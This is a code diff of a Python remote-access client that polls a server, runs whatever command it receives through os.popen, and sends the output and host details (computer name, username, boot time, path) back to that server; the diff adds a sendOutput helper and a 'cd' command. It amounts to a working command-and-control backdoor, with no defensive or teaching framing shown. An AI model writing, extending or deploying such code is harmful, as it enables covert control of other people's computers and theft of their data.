@@ -123,6 +123,14 @@ def doInput(toPrint):
     print("["+type+"]["+time.strftime("%H:%M:%S", time.localtime())+"] "+toPrint+" >> ", end = '')
     return input()
 
+def sendOutput(session_id, to_session_id, output, terminate):
+    if(terminate):
+        output += "000-terminate-000"
+    download("output?session_id="+session_id+"&to_session_id="+to_session_id+"&output="+output.replace('"', ';quote;'))
+
+def getPath():
+    return os.path.realpath(__file__).replace(os.path.basename(__file__), "")
+
 # Main section
 today = date.today()
 date_today = today.strftime("%d/%m/%Y")
@@ -148,9 +156,9 @@ if(os.path.exists("reboot.log")):
     output += "\nHost username     : "+os.environ['USERNAME']
     output += "\nBoot time         : "+boot_time
     output += "\nConnection status : Connected"
-    output += "\nRunning path      : "+os.path.realpath(__file__)
+    output += "\nRunning path      : "+getPath()
     output += "\n========================================="
-    download("output?session_id="+session_id+"&to_session_id="+reboot_session+"&output="+output.replace('"', ';quote;')+"000-terminate-000")
+    sendOutput(session_id, reboot_session, output, True)
 while(True == True):
     internet = is_connected("www.google.com")
     while(internet == False):
@@ -164,23 +172,27 @@ while(True == True):
     if not(download_response == []):
         response = json.loads(download_response)
         if(len(response)>0):
-            if(response[0]['input'] == "status"):
-                output = "Host computername : "+os.environ['COMPUTERNAME']
-                output += "\nHost username     : "+os.environ['USERNAME']
-                output += "\nBoot time         : "+boot_time
-                output += "\nConnection status : Connected"
-                output += "\nRunning path      : "+os.path.realpath(__file__)
-                download("output?session_id="+session_id+"&to_session_id="+response[0]['session_id']+"&output="+output.replace('"', ';quote;')+"000-terminate-000")
+            if(response[0]['input'][:3] == "cd "):
+                sendOutput(session_id, response[0]['session_id'], "Changing directory...", False)
+                os.chdir(response[0]['input'][3:])
+                sendOutput(session_id, response[0]['session_id'], "Actual directory: "+getPath(), True)
             else:
-                if(response[0]['input'] == "reboot"):
-                    reboot_file = open("reboot.log", "w+")
-                    reboot_file.write(response[0]['session_id'])
-                    reboot_file.close()
-                    output = "Reboot sequence in progress..."
-                    download("output?session_id="+session_id+"&to_session_id="+response[0]['session_id']+"&output="+output.replace('"', ';quote;'))
-                    terminate()
+                if(response[0]['input'] == "status"):
+                    output = "Host computername : "+os.environ['COMPUTERNAME']
+                    output += "\nHost username     : "+os.environ['USERNAME']
+                    output += "\nBoot time         : "+boot_time
+                    output += "\nConnection status : Connected"
+                    output += "\nRunning path      : "+getPath()
+                    sendOutput(session_id, response[0]['session_id'], output, True)
                 else:
-                    doPrint("("+response[0]['session_id']+") >> "+response[0]['input'].replace(';quote;', '"'))
-                    output = os.popen(response[0]['input'].replace(';quote;', '"').replace(';and;', '&')).read()
-                    download("output?session_id="+session_id+"&to_session_id="+response[0]['session_id']+"&output="+output.replace('"', ';quote;')+"000-terminate-000")
+                    if(response[0]['input'] == "reboot"):
+                        reboot_file = open("reboot.log", "w+")
+                        reboot_file.write(response[0]['session_id'])
+                        reboot_file.close()
+                        sendOutput(session_id, response[0]['session_id'], "Reboot sequence in progress...", False)
+                        terminate()
+                    else:
+                        doPrint("("+response[0]['session_id']+") >> "+response[0]['input'].replace(';quote;', '"'))
+                        output = os.popen(response[0]['input'].replace(';quote;', '"').replace(';and;', '&')).read()
+                        sendOutput(session_id, response[0]['session_id'], output.replace('"', ';quote;'), True)
 terminate()
